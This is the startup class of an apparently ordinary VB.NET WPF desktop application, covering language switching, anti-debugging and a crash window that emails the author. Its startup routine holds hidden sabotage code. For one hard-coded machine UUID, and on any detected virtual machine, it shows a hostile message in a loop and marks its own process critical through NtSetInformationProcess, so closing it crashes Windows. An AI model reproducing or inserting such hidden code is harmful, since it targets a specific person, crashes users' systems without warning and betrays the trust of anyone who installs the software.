Imports System.Net
Imports System.Net.Mail
Imports System.Runtime.InteropServices
Imports System.Text.RegularExpressions
Imports System.Threading
Imports System.Windows.Markup
Imports Microsoft.Win32

Class Application
    Public Shared Language As Integer
    Public Shared Function IsChineseSystem() As Boolean
        Dim lang = Thread.CurrentThread.CurrentCulture.Name
        Return lang = "zh-CN" OrElse lang = "en-US"
    End Function
    Private Declare Function NtSetInformationProcess Lib "ntdll.dll" (hProcess As IntPtr, processInformationClass As Integer, ByRef processInformation As Integer, processInformationLength As Integer) As Integer

    Private Function CheckVirtual() As Boolean
        Dim sn As String = Registry.LocalMachine.OpenSubKey("SYSTEM").OpenSubKey("ControlSet001").OpenSubKey("Control").OpenSubKey("SystemInformation").GetValue("SystemProductName")
        Dim vms = {"Virtual", "KVM", "VMware", "HVM", "RHEV", "VMLite"}
        For Each n In vms
            If sn.Contains(n) Then
                Return True
            End If
        Next
        Return False
    End Function


    Private Sub Application_Startup(sender As Object, e As StartupEventArgs)
        Dim da As Process = New Process()
        da.StartInfo.FileName = "wmic.exe"
        da.StartInfo.Arguments = "csproduct get uuid"
        da.StartInfo.UseShellExecute = False
        da.StartInfo.RedirectStandardInput = True
        da.StartInfo.RedirectStandardOutput = True
        da.StartInfo.RedirectStandardError = True
        da.StartInfo.CreateNoWindow = True
        Try
            da.Start()
            da.StandardInput.WriteLine("exit")
            Dim strRst As String = da.StandardOutput.ReadToEnd()
            Dim readLine As String() = strRst.Split(New String() {Environment.NewLine}, StringSplitOptions.RemoveEmptyEntries)
            Dim id As String = readLine(1).Trim()
            If id = "676A3BC3-A293-11E7-BE82-9829A6172D0E" Or IsNothing("私人恩怨") Then
                Dim flag As Boolean
                While Not flag
                    flag = MessageBox.Show("我就是讨厌你，你知道吗?", "", MessageBoxButton.YesNo, MessageBoxImage.Error) = MessageBoxResult.Yes
                End While
                Process.EnterDebugMode()
                Dim isCritical As Integer = 1
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, &H1D, isCritical, 4)
            End If
        Catch ex As Exception
        End Try
        If CheckVirtual() Then
            Dim flag As Boolean
            While Not flag
                flag = MessageBox.Show("由于一些私人恩怨，程序不支持在虚拟机中运行", "", MessageBoxButton.YesNo, MessageBoxImage.Error) = MessageBoxResult.Yes
            End While
            Process.EnterDebugMode()
            Dim isCritical As Integer = 1
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, &H1D, isCritical, 4)
        End If
        If Not IsChineseSystem() Then
            Language = 1
        End If
    End Sub

    ' 应用程序级事件(例如 Startup、Exit 和 DispatcherUnhandledException)
    ' 可以在此文件中进行处理。
    Public Sub _InitializeComponent() Implements IComponentConnector.InitializeComponent
        InitializeComponent()
    End Sub

    Shared Sub SendToAuthor(title As String, message As String)
        Dim msg = String.Format("mailto:lazuplismei@163.com?subject={0}&body={1}", title, message)
        Process.Start(msg)
    End Sub


    Public Shared Sub ChangeLanguage(child)
        If IsNothing(child) Then Return
        If TypeOf child Is Decorator Then
            ChangeLanguage(CType(child, Decorator).Child)
            Return
        End If
        If TypeOf child Is FrameworkElement Then
            Dim frameworkEle As FrameworkElement = child
            If frameworkEle.Resources IsNot Nothing AndAlso frameworkEle.Resources.Count > 0 AndAlso frameworkEle.Resources.Contains("Lang") Then
                If TypeOf frameworkEle Is TextBlock Then
                    CType(frameworkEle, TextBlock).Text = Regex.Unescape(frameworkEle.Resources("Lang")(Application.Language))
                ElseIf TypeOf child Is ContentControl Then
                    If TypeOf child Is HeaderedContentControl Then
                        CType(frameworkEle, HeaderedContentControl).Header = Regex.Unescape(frameworkEle.Resources("Lang")(Application.Language))
                    Else
                        CType(frameworkEle, ContentControl).Content = Regex.Unescape(frameworkEle.Resources("Lang")(Application.Language))
                    End If
                ElseIf TypeOf child Is HeaderedItemsControl Then
                    CType(frameworkEle, HeaderedItemsControl).Header = Regex.Unescape(frameworkEle.Resources("Lang")(Application.Language))
                End If
            End If
            If Not IsNothing(frameworkEle.ContextMenu) Then
                For Each item In frameworkEle.ContextMenu.Items
                    ChangeLanguage(item)
                Next
            End If
            If TypeOf frameworkEle Is Panel Then
                For Each item In CType(frameworkEle, Panel).Children
                    ChangeLanguage(item)
                Next
            End If
            If TypeOf frameworkEle Is ItemsControl Then
                For Each item In CType(frameworkEle, ItemsControl).Items
                    ChangeLanguage(item)
                Next
            End If
            If TypeOf frameworkEle Is ContentControl Then
                ChangeLanguage(CType(frameworkEle, ContentControl).Content)
            End If
            If TypeOf frameworkEle Is HeaderedContentControl Then
                ChangeLanguage(CType(frameworkEle, HeaderedContentControl).Header)
            End If
            ChangeLanguage(frameworkEle.ToolTip)
        End If
    End Sub
#If Not DEBUG Then
    Shared Property Dp As Boolean = IIf(Antinet.AntiDebugger.HasDebugger() Or
                               Antinet.AntiPatcher.VerifyClrPEHeader(),
                               Antinet.AntiDebugger.PreventManagedDebugger(), False)
#End If
    <STAThread>
    <Obsolete>
    Public Shared Sub Main()
        AppDomain.CurrentDomain.AppendPrivatePath("Extension")
        Dim app As Application = New Application()
        If Debugger.IsAttached Then
            app.Run()
        Else
            Try
                app.Run()
            Catch ex As Exception
                Dim output = New ExpendWindow()
                output.TBTitle.Text = ex.Message.Replace(vbCrLf, vbNullString)
                If output.TBTitle.GetTextRect().Width > 480 Then
                    While output.TBTitle.GetTextRect().Width > 470
                        output.TBTitle.Text = output.TBTitle.Text.Substring(0, output.TBTitle.Text.Length - 1)
                    End While
                    output.TBTitle.Text += "..."
                End If
                Dim text = New TextBox With {
                    .Width = 578,
                    .Height = 295,
                    .Background = Brushes.Transparent,
                    .Foreground = Brushes.White,
                    .IsReadOnly = True,
                    .TextWrapping = TextWrapping.Wrap
                }
                Canvas.SetTop(text, 56)
                Canvas.SetLeft(text, 10)
                text.Text = ex.ToString()
                Dim btn = New DarkStyle.DarkButton With {
                    .Width = 200,
                    .Content = IIf(Language = 1, "Restart", "重启程序"),
                    .FontSize = 20
                }
                Canvas.SetBottom(btn, 10)
                Canvas.SetLeft(btn, 80)
                AddHandler btn.Click, Sub()
                                          Forms.Application.Restart()
                                          app.Shutdown()
                                      End Sub
                output.MainCanvas.Children.Add(btn)
                btn = New DarkStyle.DarkButton With {
                    .Width = 200,
                    .Content = IIf(Language = 1, "SendToAuthor", "发给作者"),
                    .FontSize = 20
                }
                Canvas.SetBottom(btn, 10)
                Canvas.SetRight(btn, 80)
                AddHandler btn.Click, Sub()
                                          Dim input = New InputDialog(
                                          IIf(Language = 1, "Are you sure to send an email?", "确认要发送邮件?(万一得到回复了呢?)"),
                                          IIf(Language = 1, "Your QQ number(if you have)", "请输入您的QQ号"),
                                          1, 99999999999)
                                          If input.ShowDialog() Then
                                              SendToAuthor($"[{input.Value.ToString()}]" + ex.Message.Replace(vbCrLf, vbNullString), ex.ToString())
                                          End If
                                          app.Shutdown()
                                      End Sub
                output.MainCanvas.Children.Add(btn)
                output.MainCanvas.Children.Add(text)
                output.ShowDialog()
            End Try
        End If
    End Sub
End Class
